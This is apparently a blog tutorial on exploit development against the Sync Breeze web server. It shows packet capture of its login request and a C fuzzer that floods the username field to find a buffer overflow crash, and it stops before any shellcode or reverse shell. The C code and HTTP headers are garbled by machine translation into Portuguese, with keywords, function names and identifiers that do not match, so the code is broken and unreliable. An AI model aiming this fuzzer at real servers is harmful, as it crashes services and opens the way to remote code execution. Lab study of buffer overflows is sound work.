---
title: "Exploit Development for Buffer Overflow"
date: 2025-04-06    
categories: [Exploit]
tags: [Reverse]
---

# Exploit Development for Buffer Overflow

Hello, in this post I will develop an exploit and simulate a Buffer Overflow (BOF) attack in a practical way.

Objective: trigger a Buffer Overflow, overwrite the return address, and take control of the program’s execution flow, allowing remote access to the target machine through a reverse shell.

Before the practical part, we need to understand how a BOF works. In summary, a Buffer Overflow occurs when a program writes an excessive amount of data into a buffer, exceeding its capacity and overwriting adjacent areas in memory, including the function’s return address. In x86 assembly, when calling a function, the stack expands to save the return address (EIP) and the base pointer (EBP), along with local variables. If a buffer resides on the stack and there is no boundary check, an attacker can input data that exceeds the buffer size, which may result in modifying the EIP, allowing the manipulation of the execution flow and later the execution of a shellcode.

## Understanding the Application:
In the testing environment with Sync Breeze properly configured on Debian 12, we will open it in the browser.

![alt text](https://miro.medium.com/v2/resize:fit:720/format:webp/1*KKyprCZMgPUxKjfd42_plw.png)

With the intention of capturing the requests to start analyzing how the application works, we will use TCPDUMP to understand and capture the network packets.

<pre>sudo tcpdump -i enp5s0 -s0 -w analise_sync.pcap </pre>


While tcpdump captures the network packets, we interact with the application to capture the requests made between the client and the server.

![alt text](https://miro.medium.com/v2/resize:fit:720/format:webp/1*WwHpeS_E_vY8GhzmTxSyAw.png)

![alt text](https://miro.medium.com/v2/resize:fit:720/format:webp/1*fbkcVuCiCAGwKABGwZOTtg.png)

After interacting with the application solely for the purpose of generating network packets and understanding what happens under the hood, we will analyze these packets using a tool called Wireshark, which provides better visibility of the packets.

![alt text](https://miro.medium.com/v2/resize:fit:720/format:webp/1*DswB1tFgeWj8cmIAE_9BAw.png)

We will filter only by the HTTP protocol.

![alt text](https://miro.medium.com/v2/resize:fit:720/format:webp/1*cOhRsQRarjAvy-kvIk03vw.png)

What draws attention at this moment is the POST method, which is accessing /login.

![alt text](https://miro.medium.com/v2/resize:fit:720/format:webp/1*yDp5OKjujv8dqlEADMy4tg.png)

The application has some input fields, which allows us to build a fuzzer to analyze potential vulnerabilities. For that, we will use the following HTTP request header, where we will inject random data and perform tests for our BOF.

<pre>POST /login HTTP/1.1 
Host: 192.168.5.17:8080 
Conexão: keep-alive 
Comprimento do conteúdo: 37 
Controle do cache: max-age=0 
Origem: http://192.168.5.17:8080 
Tipo de conteúdo: application/x-www-form-urlencoded 
Solicitações de atualização inseguras: 1 
Agente do usuário: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, como Gecko) Chrome/134.0.0.0 Safari/537.36 
Aceitar: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 
Referenciador: http://192.168.5.17:8080/login 
Aceitar-Codificação: gzip, deflate 
Aceitar-Idioma: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7

 username=teste1234&password=senha1234</pre>

## Building and Testing Our Fuzzer:
With the header in hand, we can start building our fuzzer in C language, targeting the /login endpoint. I am breaking the code into parts for better understanding.

<pre># incluir  <stdio.h>
 # incluir  <stdlib.h>
 # incluir  <string.h>
 # incluir  <unistd.h>
 # incluir  <arpa/inet.h>

 # definir IP_DO_SERVIDOR "192.168.5.17"
 # definir PORTA_DO_SERVIDOR 8080 
# definir TAMANHO_DO_BUFFER 4096 

int  main () { 
    int sock; 
    struct  sockaddr_in  server ; 
    char buffer[TAMANHO_DO_BUFFER]; 
    
    for ( int fuzz = 100 ; fuzz <= 2000 ; fuzz += 100 ) { 
        char *buf = ( char *) malloc (fuzz + 1 ); 
        memset (buf, 'A' , fuzz); 
        buf[fuzz] = '\0' ; 

        char payload[TAMANHO_DO_BUFFER]; 
        snprintf (payload, sizeof (payload), "nome de usuário=%s&senha=123456" , buf); 

        char request[BUFFER_SIZE]; 
        snprintf (request, sizeof (request), 
            "POST /login HTTP/1.1\r\n" 
            "Host: %s:%d\r\n" 
            "Conexão: keep-alive\r\n" 
            "Tamanho do conteúdo: %lu\r\n" 
            "Controle de cache: idade máxima=0\r\n" 
            "Origem: http://%s:%d\r\n" 
            "Tipo de conteúdo: application/x-www-form-urlencoded\r\n" 
            "Solicitações de atualização inseguras: 1\r\n" 
            "Agente do usuário: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, como Gecko) Chrome/134.0.0.0 Safari/537.36\r\n" 
            "Aceitar: texto/html,aplicativo/xhtml+xml,aplicativo/xml;q=0.9,imagem/webp,*/*;q=0.8,aplicativo/signed-exchange;v=b3;q=0.7\r\n" 
            "Referência: http://%s:%d/login\r\n" 
            "Aceitar codificação: gzip, deflate\r\n" 
            "Aceitar idioma: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7\r\n" 
            "\r\n" 
            "%s" , 
            IP_DO_SERVIDOR, PORTA_DO_SERVIDOR, strlen (carga útil), 
            IP_DO_SERVIDOR, PORTA_DO_SERVIDOR, 
            IP_DO_SERVIDOR, PORTA_DO_SERVIDOR, 
            carga útil); 

        if ((sock = socket(AF_INET, SOCK_STREAM,0 )) < 0 ) { 
            perror( "Erro ao criar soquete" ); 
            grátis (buff); 
            retornar  1 ; 
        } 

        servidor.sin_family = AF_INET; 
        servidor.sin_port=htons(SERVER_PORT);
        if (inet_pton(AF_INET, SERVER_IP, &server.sin_addr) <= 0 ) { 
            perror( "Endereço inválido" ); 
            free (buf); 
            close(sock); 
            return  1 ; 
        } 

        if (connect(sock, ( struct sockaddr *)&server, sizeof (server)) < 0 ) { 
            perror( "Erro ao conectar ao servidor" ); 
            free (buf); 
            close(sock); 
            return  1 ; 
        } 

        printf ( "[*] Enviando %d bytes no parâmetro username...\n" , fuzz); 
        if (send(sock, request, strlen (request), 0 ) < 0 ) { 
            perror( "Erro ao enviar dados" ); 
            free (buf); 
            close(sock); 
            return  1 ; 
        } 

        int bytes_received = recv(sock, buffer, sizeof (buffer) - 1 , 0 ); 
        if (bytes_received > 0 ) { 
            buffer[bytes_received] = '\0' ; 
            printf ( "Resposta:\n%s\n" , buffer); 
        } else { 
            perror( "Erro ao receber resposta" ); 
        } 

        close(sock); 
        free (buf); 
    } 

    return  0 ; 
}</pre>

My fuzzer looks like this, and I will explain some important details about the code. The code performs fuzzing on the username field of an HTTP POST request, sending buffers of different sizes to test possible vulnerabilities in the server.

First, it runs a loop that generates buffers from 100 to 2000 bytes, filled with the letter “A”, using the memset() function. This buffer is then incorporated into the request payload, which contains the username and password fields.

Next, the program builds the HTTP request, including the headers and other necessary components to simulate a legitimate request. It also establishes a TCP socket, allowing communication with the server. If the connection is successful, the HTTP request is sent using the send() function.

By running the fuzzer, it was possible to observe at which point in the payload the application stops responding.

![alt text](https://miro.medium.com/v2/resize:fit:720/format:webp/1*Mzpmyv2566f7qW4YkWlANQ.png)